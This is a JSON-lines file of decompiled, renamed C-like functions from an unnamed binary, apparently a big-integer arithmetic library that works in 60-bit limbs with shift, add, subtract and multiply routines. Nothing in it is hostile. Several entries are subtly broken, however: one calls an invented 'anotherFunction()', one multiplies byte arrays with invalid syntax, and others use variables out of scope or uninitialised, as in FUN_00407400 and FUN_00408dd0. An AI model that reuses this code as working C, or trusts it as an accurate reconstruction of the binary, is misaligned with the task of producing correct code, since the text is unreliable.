{"Function Name": "FUN_004071f0", "Address": "004071f0", "Source Code": "undefined8 FUN_004071f0(int *inputArray, int blockCount, int *outputArray)\n{\n    long longValueAddress; \n    int fullBlocks; \n    int adjustedIndex; \n    undefined8 functionResult; \n    long *lastLongValuePointer; \n    long loopCounter; \n    undefined8 *undefined8Pointer; \n    int secondElement; \n    if (blockCount < 1) { \n        outputArray[2] = 0; \n        *outputArray = 0; \n        loopCounter = 0; \n        longValueAddress = *(long *)(outputArray + 4); \n        secondElement = outputArray[1]; \n        if (0 < secondElement) { \n            do {\n                *(undefined8 *)(longValueAddress + loopCounter * 8) = 0; \n                loopCounter++; \n            } while (loopCounter < secondElement); \n        }\n        return 0; \n    } else {\n        if (SBORROW4(blockCount, *inputArray * 0x3c) == blockCount + *inputArray * -0x3c < 0) { \n            return FUN_00406750(inputArray, outputArray); \n        }\n        functionResult = FUN_00406750(inputArray, outputArray); \n        if ((int)functionResult != 0) { \n            return functionResult; \n        }\n        secondElement = *outputArray; \n        longValueAddress = *(long *)(outputArray + 4); \n        fullBlocks = blockCount / 0x3c; \n        adjustedIndex = (uint)(blockCount != fullBlocks * 0x3c) + fullBlocks; \n        if (adjustedIndex < secondElement) { \n            undefined8Pointer = (undefined8 *)(longValueAddress + (long)adjustedIndex * 8); \n            do {\n                *undefined8Pointer = 0; \n                undefined8Pointer++; \n            } while (undefined8Pointer != (undefined8 *)(longValueAddress + 8 + ((long)adjustedIndex + (ulong)(uint)((secondElement + -1) - adjustedIndex)) * 8)); \n        }\n        *(ulong *)(longValueAddress + (long)fullBlocks * 8) &= (1L << ((char)blockCount + (char)((ulong)(long)blockCount / 0x3c) * '\\x04' & 0x3fU)) - 1U; \n        if (secondElement < 1) { \n            if (secondElement != 0) { \n                return 0; \n            }\n        } else {\n            if (*(long *)(longValueAddress + -8 + (long)secondElement * 8) != 0) { \n                return 0; \n            }\n            lastLongValuePointer = (long *)(longValueAddress + -0x10 + (long)secondElement * 8); \n            while (secondElement-- != 0) { \n                longValueAddress = *lastLongValuePointer--; \n                if (longValueAddress != 0) { \n                    *outputArray = secondElement; \n                    return 0; \n                }\n            }\n            *outputArray = 0; \n        }\n        outputArray[2] = 0; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00407400", "Address": "00407400", "Source Code": "undefined8 FUN_00407400(int *inputArray1, int *inputArray2)\n{\n    int valueFromInputArray2 = *inputArray2; \n    int valueFromInputArray1 = *inputArray1; \n    \n    if ((inputArray2[1] <= valueFromInputArray1) && (inputArray2[1] < valueFromInputArray1 + 1)) {\n        undefined8 uVar8 = FUN_00405a20(inputArray2); \n        if ((int)uVar8 != 0) { \n            return uVar8; \n        }\n    }\n    *inputArray2 = valueFromInputArray1; \n    int valueFromInputArray1Again = *inputArray1; \n    long longValueFromInputArray1 = *(long *)(inputArray1 + 4); \n    long longValueFromInputArray2 = *(long *)(inputArray2 + 4); \n    \n    \n    if (valueFromInputArray1Again > 0) {\n        long index = 0; \n        ulong carry = 0; \n        do {\n            ulong currentValue = *(ulong *)(longValueFromInputArray1 + index * 8); \n            ulong shiftedValue = currentValue >> 0x3b; \n            *(ulong *)(longValueFromInputArray2 + index * 8) = currentValue * 2 & 0xfffffffffffffff | carry; \n            index++; \n            carry = shiftedValue; \n        } while (index < valueFromInputArray1Again); \n        \n        \n        if (shiftedValue != 0) {\n            valueFromInputArray1++; \n            *(undefined8 *)(longValueFromInputArray2 + 8 + (ulong)(valueFromInputArray1Again - 1) * 8) = 1; \n            *inputArray2 = valueFromInputArray1; \n        }\n    }\n    undefined8 *pointerToLongValue2 = (undefined8 *)(longValueFromInputArray2 + (long)valueFromInputArray1 * 8); \n    \n    if (valueFromInputArray1 < valueFromInputArray2) {\n        undefined8 *endPointer = pointerToLongValue2 + (ulong)(uint)((valueFromInputArray2 + -1) - valueFromInputArray1) + 1; \n        do {\n            *pointerToLongValue2++ = 0; \n        } while (pointerToLongValue2 != endPointer); \n    }\n    \n    inputArray2[2] = inputArray1[2]; \n    return 0; \n}"}
{"Function Name": "FUN_004076b0", "Address": "004076b0", "Source Code": "undefined8\nFUN_004076b0(int *inputArray,long inputLength,int operationFlag,long blockSize,int reverseFlag,ulong bitMask,\nlong dataPointer)\n{\n    long intermediateValue; \n    undefined8 functionResult; \n    ulong *unsignedLongArrayPointer; \n    int currentCount; \n    long iterationCount; \n    ulong bitCounter; \n    uint bitToggle; \n    uint lowerBits; \n    byte maskValue; \n    byte byteValue; \n    long outerLoopCounter; \n    inputArray[2] = 0; \n    *inputArray = 0; \n    currentCount = inputArray[1]; \n    iterationCount = 0; \n    unsignedLongArrayPointer = *(ulong **)(inputArray + 4); \n    if (0 < currentCount) { \n        do {\n            unsignedLongArrayPointer[iterationCount] = 0; \n            iterationCount++; \n        } while (iterationCount < currentCount); \n    }\n    bitToggle = 0xffffffff; \n    maskValue = 0xff; \n    if (reverseFlag == 0) { \n        reverseFlag = -1; \n    }\n    lowerBits = (uint)bitMask & 7; \n    if (lowerBits != 0) { \n        for (bitCounter = 0; bitCounter < lowerBits; bitCounter++) { \n            bitToggle ^= 1 << (7U - (char)bitCounter & 0x1f); \n        }\n        maskValue = (byte)bitToggle; \n    }\n    if (inputLength != 0) { \n        outerLoopCounter = 0; \n        iterationCount = blockSize - (bitMask >> 3); \n        do {\n            if (iterationCount != 0) { \n                long indexValue = (inputLength - 1) - outerLoopCounter; \n                if (operationFlag == 1) { \n                    indexValue = outerLoopCounter; \n                }\n                for (long innerLoopCounter = 0; innerLoopCounter < iterationCount; innerLoopCounter++) { \n                    intermediateValue = innerLoopCounter + (bitMask >> 3); \n                    if (reverseFlag != 1) { \n                        intermediateValue = (iterationCount - 1) - innerLoopCounter; \n                    }\n                    currentCount = (innerLoopCounter == 0) ? 8 - lowerBits : 8; \n                    byteValue = *(byte *)(intermediateValue + dataPointer + indexValue * blockSize); \n                    functionResult = FUN_004074e0(inputArray, currentCount, inputArray); \n                    if ((int)functionResult != 0) { \n                        return functionResult; \n                    }\n                    unsignedLongArrayPointer = *(ulong **)(inputArray + 4); \n                    if (innerLoopCounter == 0) { \n                        byteValue &= maskValue; \n                    }\n                    *unsignedLongArrayPointer = (ulong)byteValue | *unsignedLongArrayPointer; \n                    (*inputArray)++; \n                }\n            }\n            outerLoopCounter++; \n        } while (outerLoopCounter != inputLength); \n        currentCount = *inputArray; \n        if (currentCount < 1) { \n            if (currentCount != 0) { \n                return 0; \n            }\n        } else {\n            ulong *lastElementPointer = unsignedLongArrayPointer + (long)currentCount - 2; \n            if (unsignedLongArrayPointer[(long)currentCount - 1] != 0) { \n                return 0; \n            }\n            while (currentCount-- != 0) { \n                bitCounter = *lastElementPointer--; \n                if (bitCounter != 0) { \n                    *inputArray = currentCount + 1; \n                    return 0; \n                }\n            }\n            *inputArray = 0; \n        }\n    }\n    inputArray[2] = 0; \n    return 0; \n}"}
{"Function Name": "FUN_004078b0", "Address": "004078b0", "Source Code": "undefined8 FUN_004078b0(int *inputArray, ulong multiplier, int *outputArray)\n{\n    int inputValue = *inputArray; \n    int incrementedValue = inputValue + 1; \n    \n    if ((outputArray[1] <= inputValue) && (outputArray[1] < incrementedValue)) {\n        undefined8 uVar10 = FUN_00405a20(outputArray, incrementedValue); \n        if ((int)uVar10 != 0) { \n            return uVar10; \n        }\n        inputValue = *inputArray; \n        incrementedValue = inputValue + 1; \n    }\n    long longValue = *(long *)(inputArray + 4); \n    ulong *ulongPointer = *(ulong **)(outputArray + 4); \n    outputArray[2] = inputArray[2]; \n    ulong resultValue = 0; \n    int conditionalValue = (inputValue < 1) ? 2 : 1; \n    \n    for (long loopIndex = 0; loopIndex < inputValue; loopIndex++) {\n        undefined firstArray[16] = {0}; \n        firstArray[0] = multiplier; \n        undefined secondArray[16] = {0}; \n        secondArray[0] = *(ulong *)(longValue + loopIndex * 8); \n        undefined thirdArray[16] = {0}; \n        thirdArray = firstArray * secondArray + thirdArray; \n        resultValue = thirdArray[0]; \n        ulongPointer[loopIndex] = resultValue & 0xfffffffffffffff; \n        resultValue = resultValue >> 0x3c | thirdArray[8] << 4; \n    }\n    ulong *endPointer = ulongPointer + inputValue; \n    *endPointer = resultValue; \n    \n    while (incrementedValue < inputValue) {\n        endPointer++; \n        *endPointer = 0; \n        incrementedValue++; \n    }\n    *outputArray = incrementedValue; \n    \n    if (incrementedValue > 0) {\n        endPointer = ulongPointer + incrementedValue - 2; \n        \n        while (ulongPointer[incrementedValue - 1] == 0) {\n            incrementedValue--; \n            if (incrementedValue == 0) { \n                *outputArray = 0; \n                outputArray[2] = 0; \n                return 0; \n            }\n            endPointer--; \n        }\n        *outputArray = incrementedValue; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00407a20", "Address": "00407a20", "Source Code": "ulong FUN_00407a20(uint *inputPointerA, uint *inputPointerB)\n{\n    \n    if (inputPointerA != inputPointerB) {\n        \n        ulong result = anotherFunction();\n        \n        if (result != 0) {\n            return result;\n        }\n    }\n    \n    if (*inputPointerB == 0) {\n        \n        inputPointerB[2] = 0;\n        \n        return (ulong)*inputPointerB;\n    }\n    \n    inputPointerB[2] = (uint)(inputPointerA[2] == 0);\n    \n    return 0;\n}"}
{"Function Name": "FUN_00407a70", "Address": "00407a70", "Source Code": "undefined8 FUN_00407a70(int *param_1, int *param_2, undefined8 *param_3) {\n    ulong *bitwisePointer; \n    int secondParamValue; \n    long longValueFromParam; \n    long loopCounter; \n    int localValue; \n    undefined4 localFourByteValue; \n    long localLongValue; \n    \n    if (*param_2 < *param_1) {\n        \n        if (FUN_00406f80(&localValue, param_1) != 0) {\n            return 1; \n        }\n        secondParamValue = *param_2; \n        param_1 = param_2; \n    } else {\n        \n        if (FUN_00406f80(&localValue) != 0) {\n            return 1; \n        }\n        secondParamValue = *param_1; \n    }\n    \n    if (0 < secondParamValue) {\n        longValueFromParam = *(long *)(param_1 + 4); \n        loopCounter = 0; \n        do {\n            bitwisePointer = (ulong *)(localLongValue + loopCounter * 8); \n            *bitwisePointer |= *(ulong *)(longValueFromParam + loopCounter * 8); \n            loopCounter++; \n        } while (loopCounter < secondParamValue); \n    }\n    \n    if (localValue < 1) {\n        \n        localFourByteValue = (localValue == 0) ? 0 : localFourByteValue;\n    } else {\n        \n        longValueFromParam = *(long *)(localLongValue + -8 + (long)localValue * 8);\n        long *decrementPointer = (long *)(localLongValue + -0x10 + (long)localValue * 8); \n        \n        while (longValueFromParam == 0) {\n            localValue--; \n            if (localValue == 0) { \n                localValue = 0; \n                localFourByteValue = 0; \n                break; \n            }\n            longValueFromParam = *decrementPointer--; \n        }\n    }\n    \n    undefined8 combinedValue = CONCAT44(localValue, localFourByteValue);\n    localValue = *(int *)param_3; \n    localFourByteValue = *(undefined4 *)((long)param_3 + 4); \n    undefined4 thirdParamValue = *(undefined4 *)(param_3 + 1); \n    undefined8 thirdValueFromParam = param_3[2]; \n    *param_3 = combinedValue; \n    param_3[1] = CONCAT44(thirdParamValue, localFourByteValue); \n    param_3[2] = localLongValue; \n    FUN_004064f0(&localValue); \n    return 0; \n}"}
{"Function Name": "FUN_00407e40", "Address": "00407e40", "Source Code": "void FUN_00407e40(int *array, int remove_count)\n{\n    undefined8 *array_data_ptr; \n    int current_size; \n    long loop_index; \n    long shift_index; \n    int new_size; \n    int elements_shifted; \n    \n    if (0 < remove_count) {\n        current_size = *array; \n        \n        if (remove_count < current_size) {\n            array_data_ptr = *(undefined8 **)(array + 4); \n            new_size = current_size - remove_count; \n            \n            if (new_size < 1) {\n                elements_shifted = 0; \n            } else {\n                shift_index = 0; \n                \n                do {\n                    array_data_ptr[shift_index] = array_data_ptr[remove_count + shift_index]; \n                    shift_index++; \n                } while (shift_index < new_size); \n                array_data_ptr += new_size; \n                elements_shifted = new_size; \n            }\n            \n            if (elements_shifted < current_size) {\n                for (long remaining_index = current_size - elements_shifted; remaining_index > 0; remaining_index--) {\n                    *array_data_ptr++ = 0; \n                }\n            }\n            *array = new_size; \n            return; \n        }\n    }\n    \n    array[2] = 0; \n    *array = 0; \n    shift_index = *(long *)(array + 4); \n    current_size = array[1]; \n    \n    if (0 < current_size) {\n        \n        for (loop_index = 0; loop_index < current_size; loop_index++) {\n            *(undefined8 *)(shift_index + loop_index * 8) = 0; \n        }\n    }\n}"}
{"Function Name": "FUN_00407f00", "Address": "00407f00", "Source Code": "ulong FUN_00407f00(undefined8 param_1, int param_2, int *param_3, undefined8 *param_4)\n{\n    ulong returnValue; \n    long tempLong; \n    int tempInt; \n    long *longPointer; \n    ulong *ulongPointer; \n    ulong *iteratorPointer1; \n    ulong *iteratorPointer2; \n    undefined8 localData1; \n    undefined8 localData2; \n    undefined8 localData3; \n    \n    if (param_2 < 1) {\n        returnValue = FUN_00406750(param_1, param_3); \n        if (param_4 == (undefined8 *)0x0) { \n            return returnValue; \n        }\n        tempInt = *(int *)((long)param_4 + 4); \n        *(undefined4 *)(param_4 + 1) = 0; \n        *(undefined4 *)param_4 = 0; \n        tempLong = param_4[2]; \n        if (tempInt < 1) { \n            return returnValue; \n        }\n        \n        for (long lVar10 = 0; lVar10 < tempInt; lVar10++) {\n            *(undefined8 *)(tempLong + lVar10 * 8) = 0; \n        }\n        return returnValue; \n    }\n    returnValue = FUN_00406af0(&localData1); \n    if ((int)returnValue != 0) { \n        return returnValue; \n    }\n    \n    if (((param_4 != (undefined8 *)0x0) &&\n        (returnValue = FUN_004071f0(param_1, param_2, &localData1), returnValue != 0)) ||\n        (returnValue = FUN_00406750(param_1, param_3), returnValue != 0)) {\n        FUN_004064f0(&localData1); \n        return returnValue; \n    }\n    \n    if (0x3b < param_2) {\n        FUN_00407e40(param_3, param_2 / 0x3c); \n    }\n    \n    if (param_2 % 0x3c == 0) {\n        tempInt = *param_3; \n        if (0 < tempInt) { \n            longPointer = (long *)(*(long *)(param_3 + 4) + -0x10 + (long)tempInt * 8); \n            if (*(long *)(*(long *)(param_3 + 4) + -8 + (long)tempInt * 8) == 0) { \n                do {\n                    tempInt--; \n                    if (tempInt == 0) { \n                        *param_3 = 0; \n                        goto LAB_00407fe3; \n                    }\n                    longPointer--; \n                } while (*longPointer == 0); \n                *param_3 = tempInt; \n            }\n            goto LAB_00407fea; \n        }\n    } else {\n        byte remainderByte = (byte)(param_2 % 0x3c); \n        tempInt = *param_3; \n        ulongPointer = (ulong *)(*(long *)(param_3 + 4) + -8 + (long)tempInt * 8); \n        if (0 < tempInt) { \n            ulong returnValue = 0; \n            iteratorPointer1 = ulongPointer; \n            do {\n                iteratorPointer2 = iteratorPointer1 - 1; \n                returnValue = *iteratorPointer1 & (1L << (remainderByte & 0x3f)) - 1U; \n                *iteratorPointer1 = *iteratorPointer1 >> (remainderByte & 0x3f) | (returnValue << (0x3c - remainderByte & 0x3f)); \n                iteratorPointer1 = iteratorPointer2; \n            } while (iteratorPointer2 != ulongPointer + (-1 - (ulong)(tempInt - 1))); \n            goto LAB_00407f9f; \n        }\n    }\n    \n    if (tempInt == 0) {\nLAB_00407fe3:\n        param_3[2] = 0; \n    }\nLAB_00407fea:\n    if (param_4 != (undefined8 *)0x0) { \n        *(undefined4 *)param_4 = (undefined4)localData1; \n        *(undefined4 *)((long)param_4 + 4) = localData1._4_4_; \n        *(undefined4 *)(param_4 + 1) = (undefined4)localData2; \n        param_4[2] = localData3; \n    }\n    FUN_004064f0(&localData1); \n    return 0; \n}"}
{"Function Name": "FUN_004085f0", "Address": "004085f0", "Source Code": "ulong FUN_004085f0(long param_1,long *param_2,int param_3,ulong param_4,int param_5,ulong param_6,\nundefined8 param_7)\n{\n    char loopIndex; \n    uint bitCount; \n    ulong calculationResult; \n    ulong tempCalculation; \n    byte *bytePointer; \n    int indexCounter; \n    long remainderCount; \n    long adjustedIndex; \n    ulong remainingBits; \n    uint bitwiseResult; \n    long loopControl; \n    byte byteValue; \n    int integerArray[4]; \n    \n    calculationResult = FUN_00406f80(integerArray,param_7);\n    if ((int)calculationResult != 0) {\n        return calculationResult; \n    }\n    \n    \n    if (param_5 == 0) {\n        param_5 = -1;\n    }\n    \n    bitwiseResult = 0xffffffff; \n    byteValue = 0xff; \n    bitCount = (uint)param_6 & 7; \n    \n    \n    if ((param_6 & 7) != 0) {\n        calculationResult = 0;\n        do {\n            loopIndex = (char)calculationResult; \n            calculationResult = calculationResult + 1; \n            bitwiseResult = bitwiseResult ^ 1 << (7U - loopIndex & 0x1f); \n        } while (calculationResult != bitCount); \n        byteValue = (byte)bitwiseResult; \n    }\n    \n    \n    if (integerArray[0] == 0) {\n        calculationResult = 0; \n    }\n    else {\n        indexCounter = (integerArray[0] + -1) * 0x3c; \n        \n        for (calculationResult = integerArray[(long)integerArray[0] + -1]; calculationResult != 0; calculationResult = calculationResult >> 1) {\n            indexCounter = indexCounter + 1; \n        }\n        remainingBits = param_4 * 8 - param_6; \n        calculationResult = (ulong)(long)indexCounter / remainingBits; \n        \n        if ((ulong)(long)indexCounter % remainingBits != 0) {\n            remainderCount = 1; \n            goto LAB_00408734; \n        }\n    }\n    remainderCount = 0; \nLAB_00408734:\n    remainderCount = calculationResult + remainderCount; \n    \n    if (remainderCount != 0) {\n        loopControl = 0; \n        calculationResult = param_4 - (param_6 >> 3); \n        do {\n            \n            if (param_4 != 0) {\n                adjustedIndex = (remainderCount + -1) - loopControl; \n                \n                if (param_3 == -1) {\n                    adjustedIndex = loopControl;\n                }\n                remainingBits = 0; \n                do {\n                    tempCalculation = (param_4 - 1) - remainingBits; \n                    \n                    if (param_5 == -1) {\n                        tempCalculation = remainingBits;\n                    }\n                    bytePointer = (byte *)(tempCalculation + adjustedIndex * param_4 + param_1); \n                    \n                    if (remainingBits < calculationResult) {\n                        \n                        if (calculationResult - 1 == remainingBits) {\n                            *bytePointer = byteValue & *(byte *)integerArray;\n                            indexCounter = 8 - bitCount; \n                        }\n                        else {\n                            *bytePointer = (byte)*integerArray; \n                            indexCounter = 8; \n                        }\n                        \n                        bitwiseResult = FUN_00407f00(integerArray,indexCounter,integerArray,0);\n                        if (bitwiseResult != 0) {\n                            FUN_004064f0(integerArray); \n                            return (ulong)bitwiseResult; \n                        }\n                    }\n                    else {\n                        *bytePointer = 0; \n                    }\n                    remainingBits = remainingBits + 1; \n                } while (remainingBits != param_4); \n            }\n            loopControl = loopControl + 1; \n        } while (loopControl != remainderCount); \n    }\n    FUN_004064f0(integerArray); \n    \n    if (param_2 != (long *)0x0) {\n        *param_2 = remainderCount; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00408890", "Address": "00408890", "Source Code": "undefined8 FUN_00408890(int *input_array, ulong shifted_value)\n{\n    ulong *ulong_pointer; \n    int integer_counter; \n    long fifth_element_value; \n    int second_element_value = input_array[1]; \n    input_array[2] = 0; \n    *input_array = 0; \n    fifth_element_value = *(long *)(input_array + 4); \n    \n    if (second_element_value > 0) { \n        for (long loop_index = 0; loop_index < second_element_value; loop_index++) { \n            *(undefined8 *)(fifth_element_value + loop_index * 8) = 0; \n        }\n    }\n    for (second_element_value = 8; second_element_value > 0; second_element_value--) { \n        undefined8 function_return_value = FUN_004074e0(input_array, 4, input_array); \n        if (function_return_value != 0) { \n            return function_return_value; \n        }\n        ulong_pointer = *(ulong **)(input_array + 4); \n        *ulong_pointer |= (ulong)((uint)(shifted_value >> 0x1c) & 0xf); \n        integer_counter = *input_array + 1; \n        *input_array = integer_counter; \n        shifted_value <<= 4; \n    }\n    if (integer_counter < 1) { \n        return (integer_counter == 0) ? 0 : 0; \n    } else {\n        ulong *adjusted_pointer = ulong_pointer + (long)integer_counter - 2; \n        if (ulong_pointer[(long)integer_counter - 1] != 0) { \n            return 0; \n        }\n        while (--integer_counter != 0) { \n            if (*adjusted_pointer-- != 0) { \n                *input_array = integer_counter; \n                return 0; \n            }\n        }\n        *input_array = 0; \n    }\n    input_array[2] = 0; \n    return 0; \n}"}
{"Function Name": "FUN_00408960", "Address": "00408960", "Source Code": "void FUN_00408960(undefined8 input1, undefined8 input2)\n{\n    \n    if (FUN_00406af0() == 0) {\n        \n        FUN_00408890(input1, input2);\n    }\n}"}
{"Function Name": "FUN_004089a0", "Address": "004089a0", "Source Code": "undefined8 FUN_004089a0(int *arrayPointer, ulong shiftedValue)\n{\n    long longValue; \n    ulong *ulongPointer; \n    ulong ulongValue; \n    int count; \n    long loopCounter; \n    arrayPointer[2] = 0; \n    *arrayPointer = 0; \n    longValue = *(long *)(arrayPointer + 4); \n    int loopLimit = arrayPointer[1]; \n    if (loopLimit > 0) { \n        for (loopCounter = 0; loopCounter < loopLimit; loopCounter++) { \n            *(undefined8 *)(longValue + loopCounter * 8) = 0; \n        }\n    }\n    loopLimit = 0x10; \n    do {\n        undefined8 functionResult = FUN_004074e0(arrayPointer, 4, arrayPointer); \n        if (functionResult != 0) { \n            return functionResult; \n        }\n        ulongPointer = *(ulong **)(arrayPointer + 4); \n        *ulongPointer |= shiftedValue >> 0x3c; \n        count = *arrayPointer + 1; \n        loopLimit--; \n        *arrayPointer = count; \n        shiftedValue <<= 4; \n    } while (loopLimit != 0); \n    \n    if (count < 1) { \n        return (count != 0) ? 0 : 0; \n    } else {\n        ulong *lastElementPointer = ulongPointer + count - 2; \n        if (ulongPointer[count - 1] != 0) { \n            return 0; \n        }\n        while (--count != 0) { \n            ulongValue = *lastElementPointer--; \n            if (ulongValue != 0) { \n                *arrayPointer = count; \n                return 0; \n            }\n        }\n        *arrayPointer = 0; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00408a70", "Address": "00408a70", "Source Code": "undefined8 FUN_00408a70(int *inputArray, ulong shiftedValue)\n{\n    long longValueFromArray; \n    ulong *ulongPointer; \n    ulong ulongValue; \n    int integerValue; \n    long loopCounter; \n    inputArray[2] = 0; \n    *inputArray = 0; \n    longValueFromArray = *(long *)(inputArray + 4); \n    int loopLimit = inputArray[1]; \n    if (0 < loopLimit) { \n        for (loopCounter = 0; loopCounter < loopLimit; loopCounter++) { \n            *(undefined8 *)(longValueFromArray + loopCounter * 8) = 0; \n        }\n    }\n    loopLimit = 0x10; \n    do {\n        undefined8 functionResult = FUN_004074e0(inputArray, 4, inputArray); \n        if ((int)functionResult != 0) { \n            return functionResult; \n        }\n        ulongPointer = *(ulong **)(inputArray + 4); \n        *ulongPointer |= shiftedValue >> 0x3c; \n        integerValue = *inputArray + 1; \n        loopLimit--; \n        *inputArray = integerValue; \n        shiftedValue <<= 4; \n    } while (loopLimit != 0); \n    \n    if (integerValue < 1) { \n        return (integerValue != 0) ? 0 : 0; \n    } else {\n        ulong *lastValidUlongPointer = ulongPointer + (long)integerValue - 2; \n        if (ulongPointer[(long)integerValue - 1] != 0) { \n            return 0; \n        }\n        while (--integerValue != 0) { \n            ulongValue = *lastValidUlongPointer--; \n            if (ulongValue != 0) { \n                *inputArray = integerValue; \n                return 0; \n            }\n        }\n        *inputArray = 0; \n    }\n    return 0; \n}"}
{"Function Name": "FUN_00408b90", "Address": "00408b90", "Source Code": "undefined8 FUN_00408b90(int *param_1, ulong param_2, int *param_3)\n{\n    undefined8 returnValue; \n    ulong *param3ElementsPtr;    \n    ulong *param1ElementsPtr;    \n    ulong *nextParam3ElementPtr;    \n    long *previousValuesPtr;     \n    long currentLongValue;      \n    int param1Value;       \n    int loopControlVar1;       \n    int param3Value;       \n    int loopControlVar2;      \n    \n    if (param_3[1] <= *param_1 && param_3[1] < *param_1 + 1 && (returnValue = FUN_00405a20(param_3), (int)returnValue != 0)) {\n        return returnValue; \n    }\n    \n    \n    if (param_1[2] == 1) {\n        param_1[2] = 0; \n        returnValue = FUN_00408dd0(param_1, param_2, param_3); \n        param_3[2] = 1; \n        param_1[2] = 1; \n        \n        param3Value = *param_3; \n        if (param3Value < 1) { \n            if (param3Value != 0) {\n                return returnValue; \n            }\n        } else {\n            \n            if (*(long *)(*(long *)(param_3 + 4) + -8 + (long)param3Value * 8) != 0) {\n                return returnValue; \n            }\n            previousValuesPtr = (long *)(*(long *)(param_3 + 4) + -0x10 + (long)param3Value * 8); \n            while (param3Value-- != 0) { \n                currentLongValue = *previousValuesPtr--; \n                if (currentLongValue != 0) { \n                    *param_3 = param3Value; \n                    return returnValue; \n                }\n            }\n            *param_3 = 0; \n        }\n        param_3[2] = 0; \n        return returnValue; \n    }\n    \n    param3Value = *param_1; \n    param1ElementsPtr = *(ulong **)(param_1 + 4); \n    param3ElementsPtr = *(ulong **)(param_3 + 4); \n    \n    \n    if (param3Value == 1) {\n        if (param_2 < *param1ElementsPtr) { \n            goto LAB_00408c73; \n        }\n        *param3ElementsPtr = param_2 - *param1ElementsPtr; \n    } else {\n        if (param3Value != 0) { \n            LAB_00408c73:\n            *param3ElementsPtr = *param1ElementsPtr - param_2; \n            param_3[2] = 0; \n            nextParam3ElementPtr = param3ElementsPtr + 1; \n            \n            \n            if (*param_1 < 2) {\n                loopControlVar1 = 2; \n            } else {\n                long lVar12 = 0; \n                do {\n                    \n                    *param3ElementsPtr++ = *(long *)((long)param1ElementsPtr + lVar12 + 8) + ((*param3ElementsPtr >> 0x3f));\n                    lVar12 += 8; \n                } while (lVar12 != (ulong)(*param_1 - 2) * 8 + 8); \n                nextParam3ElementPtr = param3ElementsPtr + 1; \n                loopControlVar1 = *param_1 + 1; \n            }\n            goto joined_r0x00408c01; \n        }\n        *param3ElementsPtr = param_2; \n    }\n    \n    nextParam3ElementPtr = param3ElementsPtr + 1; \n    param_3[2] = 1; \n    *param_3 = 1; \n    param3Value = 1; \n    loopControlVar2 = 1; \n    loopControlVar1 = 2; \njoined_r0x00408c01:\n    while (loopControlVar2 < param1Value) { \n        *nextParam3ElementPtr++ = 0; \n        loopControlVar2++; \n    }\n    \n    \n    if (param3Value > 0) {\n        param1ElementsPtr = param3ElementsPtr + (long)param3Value - 2; \n        \n        if (param3ElementsPtr[(long)param3Value - 1] == 0) {\n            do {\n                if (--param3Value == 0) { \n                    *param_3 = 0; \n                    goto LAB_00408c5a; \n                }\n            } while (*--param1ElementsPtr == 0); \n            *param_3 = param3Value; \n        }\n    }\nLAB_00408c5a:\n    param_3[2] = 0; \n    return 0; \n}"}
{"Function Name": "FUN_00408dd0", "Address": "00408dd0", "Source Code": "undefined8 FUN_00408dd0(int *inputArray, ulong inputValue, int *outputArray)\n{\n    ulong *arrayPointer; \n    long tempLong; \n    undefined8 returnValue; \n    int index; \n    ulong calculatedValue; \n    ulong *arrayInParam3 = *(ulong **)(outputArray + 4); \n    \n    if (((outputArray[1] <= *inputArray) && (outputArray[1] < *inputArray + 1)) &&\n        (returnValue = FUN_00405a20(outputArray), (int)returnValue != 0)) {\n        return returnValue; \n    }\n    \n    if (inputArray[2] == 1) {\n        arrayPointer = *(ulong **)(inputArray + 4); \n        \n        if ((1 < *inputArray) || (inputValue <= *arrayPointer)) {\n            inputArray[2] = 0; \n            returnValue = FUN_00408b90(inputArray, inputValue, outputArray); \n            index = *outputArray; \n            outputArray[2] = 1; \n            inputArray[2] = 1; \n            \n            if (index < 1) {\n                if (index != 0) {\n                    return returnValue; \n                }\n            } else {\n                \n                if (*(long *)(*(long *)(outputArray + 4) + -8 + (long)index * 8) != 0) {\n                    return returnValue; \n                }\n                long *calculatedAddressPointer = (long *)(*(long *)(outputArray + 4) + -0x10 + (long)index * 8); \n                \n                while (index = index - 1, index != 0) {\n                    tempLong = *calculatedAddressPointer; \n                    calculatedAddressPointer = calculatedAddressPointer - 1; \n                    if (tempLong != 0) {\n                        *outputArray = index; \n                        return returnValue; \n                    }\n                }\n                *outputArray = 0; \n            }\n            outputArray[2] = 0; \n            return returnValue; \n        }\n    } else {\n        arrayPointer = *(ulong **)(inputArray + 4); \n    }\n    outputArray[2] = 0; \n    index = *outputArray; \n    \n    if (inputArray[2] == 0) {\n        int firstElement = *inputArray; \n        ulong *nextElementPointer = arrayInParam3 + 1; \n        calculatedValue = inputValue + *arrayPointer >> 0x3c; \n        *arrayInParam3 = inputValue + *arrayPointer & 0xfffffffffffffff; \n        \n        if (firstElement < 2) {\n            index = 2; \n        } else {\n            long tempLong = 0; \n            do {\n                calculatedValue += *(long *)((long)arrayPointer + tempLong + 8); \n                *(ulong *)((long)arrayInParam3 + tempLong + 8) = calculatedValue & 0xfffffffffffffff; \n                tempLong += 8; \n                calculatedValue >>= 0x3c; \n            } while (tempLong != (ulong)(firstElement - 2) * 8 + 8); \n            nextElementPointer = (ulong *)((long)nextElementPointer + tempLong); \n            index = firstElement + 1; \n        }\n        firstElement = firstElement + 1; \n        *nextElementPointer = calculatedValue; \n        nextElementPointer = nextElementPointer + 1; \n        *outputArray = firstElement; \n    } else {\n        *outputArray = 1; \n        ulong *nextElementPointer = arrayInParam3 + 1; \n        \n        if (*inputArray == 1) {\n            *arrayInParam3 = inputValue - *arrayPointer; \n            index = 1; \n        } else {\n            *arrayInParam3 = inputValue; \n            index = 1; \n        }\n        \n        while (index < *outputArray) {\n            *nextElementPointer = 0; \n            nextElementPointer = nextElementPointer + 1; \n            index++; \n        }\n        \n        if (firstElement < 1) {\n            if (firstElement == 0) {\n                outputArray[2] = 0; \n            }\n        } else {\n            arrayPointer = arrayInParam3 + (long)firstElement - 2; \n            \n            if (arrayInParam3[(long)firstElement - 1] == 0) {\n                do {\n                    firstElement--; \n                    if (firstElement == 0) {\n                        *outputArray = 0; \n                        outputArray[2] = 0; \n                        return 0; \n                    }\n                    calculatedValue = *arrayPointer; \n                    arrayPointer--; \n                } while (calculatedValue == 0); \n                *outputArray = firstElement; \n            }\n        }\n    }\n    return 0; \n}"}
